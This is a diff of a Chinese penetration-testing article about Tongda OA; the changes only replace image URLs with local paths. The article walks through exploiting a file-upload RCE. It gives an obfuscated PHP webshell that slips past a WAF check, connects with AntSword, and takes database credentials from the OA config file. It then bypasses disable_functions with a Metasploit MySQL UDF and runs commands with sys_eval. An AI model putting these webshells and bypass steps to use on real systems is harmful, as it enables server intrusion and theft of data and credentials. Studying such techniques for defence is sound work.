@@ -54,36 +54,36 @@ RCE过的朋友都知道，通达OA在传马之后，常常出现disable_functio
 2，  
 通达OA-RCE无法执行命令的解决  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVjg1ywiadVOvicbvADaKzXtbeM6EHZNtZia40Zjz9OzdsgEL0qiaksyvicyA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/17ffdbc0e250ef688854641830b10f98de802ef13b9ce74ec95258b9eeccd76f.png "")  
   
 问题一：  
   
 通过扫描，发现该站点存在tongda-oa-action-upload-php-upload，随后，你像疯了一样进行验证，  
 发现确实存在  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVoWEFM3s8kjgia2Bp3taKK2UsrZOibkaiciaNV8H1gaECDib6Fjjac8QC9Ew/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/41ef3429dd13dd2dc1cc4322f0b482cf4e8f32c5485ba099e6f2fbbb9a018df1.png "")  
   
 聪明的你就想传木马了，于是你先传了一个system函数，想执行命令，但是，你发现了一个问题，没办法执行  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVH8cAyMic6eAp21E1Qia5miaGw8QARtLUWGno860krLapS3K6XsBVSpqUQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/c30ee6c871db7004220a92ff3017acb5e1cfbfa5de5cbd4225085c15e8ff4e45.png "")  
   
   
 随后，你从裤裆掏出你的eval函数，单独执行  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVcs2lPEfN1kDgTCXgOq9SiaFhKTfCkNfexOy7j7Ouf9jYnODWiaqW8MzQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/194c0e900642359d31025cabe36f95ba5e1cd4e47e256541d425b728a80b00e6.png "")  
   
   
 你发现你的eval函数是可以执行的，你欣喜若狂，就当你上传木马的时候  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVOjQBfT1nmcf8Z0hMIgnoHCswh4pBHeW1naG2PBhzjMfq7RmOQ89ukQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/cd72b7d2d511df7cf022dd37a03fbec931ab19845046bf1e38b33bc154efb037.png "")  
   
 现实再次给你当头一棒，无法上传  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNV13TxSBnbDTpU6mhHq9GcyHOpQ5mVZduAx0ia6eNhef6pgKG7Yg7O9gw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/442aff73e451167e2aa452904cf735e2ca1556a34dc57262b3ade4c16fbe1443.png "")  
   
 你本着遇到问题解决问题的想法，去尝试分析，是什么东西被过滤了，经过你的尝试，你发现了原来是对‘$_POST['x']’格式进行检测  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVgVtLHypVwK2GHHMZCEnKZuUCFsOuyVaA8RCy9J1D3uTYiaVDR3AF37A/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/afebab2b6ae86d448a22bd6b7364a9495f084368ac629ea6c9798f7b6e72a680.png "")  
   
   
 常规的加号无法绕过，这个时候，你想起了你曾经打CTF的时候学习的无参RCE和参数覆盖，随后你制作了如下木马，成功上传；  
@@ -93,7 +93,7 @@ RCE过的朋友都知道，通达OA在传马之后，常常出现disable_functio
 <?php eval(reset(array_reverse(current(get_defined_vars()))));?>
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNViaxpBVAkrCVl5Ee4VxbBibcQ1n67fiblNpok1jTrYEd2gZHbrqfEia2n4A/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/92a40db23adbadf57d23295555e741200a58ab141cb65362650a210d686a0072.png "")  
   
 变量覆盖如下：  
 ```
@@ -103,15 +103,15 @@ eval($s);
 ?>
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVCyJuUr4mp5YVibFFV2Osvao12aicicvVuH0ocaAxJ27mpiciay9nmPWrfTA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/22801f827b8f8f95548bb0ed1a0b0859c8ad9f0e5ffc49691ca41ce8515aa214.png "")  
   
 这样我们就绕过了对$_POST['x']格式的检测  
   
 使用蚁剑成功连接  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVrHy7IfhRoAiaJWKhbrUaGuCB7tPAPEVpVwkdjAuffmXpoEWgibB3Awrg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/876a589b84037ce9ba058730fd2c3ea21a8c97eda811f1b73a8c56729cc45e9c.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVmPsHQ62WY5juT2ZgJDPmScOZA9jL4fsURBpRHwN4F0hkbhicmKav4ibA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/234d0f9108494f32bab9c295af88fcbaa11eaeb0eda421b69d8b3360a155e538.png "")  
   
 到这里我们第一个问题解决了，大家有任何疑问可直接评论区留言！  
   
@@ -132,18 +132,18 @@ udf方式绕过disable_function
 /usr/share/metasploit-framework/data/exploits/mysql
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVU5CTynA3GAKiaXcwliaYLEIWoFu24sGVibwOpBFvqqcTLtvLPK2ibibTobg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/ff586a25479d68fb1ccf04d0b5ad430f59a110057c1453d819b0723e7b909c10.png "")  
   
 连接OA的数据库，数据库账号密码地址如下：  
 ```
 E:/MYOA/webroot/inc/oa_config.php
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVYQunHoicY2hxUgmhpXY01OV9uzNGzcqR6qYsEIJwOHCgtpxJ88XoIlg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/92a1d51673b50403102580480b38a64c9290e651be4111f246ab6953684bc9a7.png "")  
   
 这里注意，无法进行端口转发，但蚁剑有数据库连接功能，这里使用蚁剑进行数据库连接  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVkfCjZ7pesEGb6P3Pjuxoe5P6kJnokBYb7bFG4EWAC3QgQgcQacuNEg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/29ec35157e281f04746aade597f8e03731aad2a4b5ba1cb34f8c2849bb145db1.png "")  
   
 下面将我们刚刚的udf进行上传，这里有一点需要注意就是上传位置  
   
@@ -151,7 +151,7 @@ E:/MYOA/webroot/inc/oa_config.php
   
 如果版本小于5.1 上传udf的位置应该放在c盘的windows或者windows32目录里  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVlEkc1egU7l0121vKQAia0B8XBAUxoWwLOdQksr1oNo52fmqaJoIUzRg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/78211a2b7cff3dba2bfa3a1f75c6368a313ca2d4226e9c3c3b9e2e5cd0d03aac.png "")  
   
 下面进行udf利用  
 ```
@@ -160,9 +160,9 @@ create function sys_eval returns string soname 'mysqludf.dll';
 select sys_eval("whoami");
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNV2A6oD8GPUQypLGs9kQYK1Ficm7f56XE5qlrnyDux7Lfshrn1UTyzxvQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/c58d964549c89e4638c1b1ea985efa70e45113f52a8c7139a3570326f4520118.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNVq9ZbTG3YMiaDIAYTEj3gNJZ4ibA33bHGxbUZtdLMiadicvLfAMnAGv7rxA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/d828a63fc9c742bd13706f361c0c38088e0bacb5715ae953bedbfd3e77c4f9e5.png "")  
   
 到这里利用了udf的方式绕过了其对disable_function的限制进行命令执行  
   
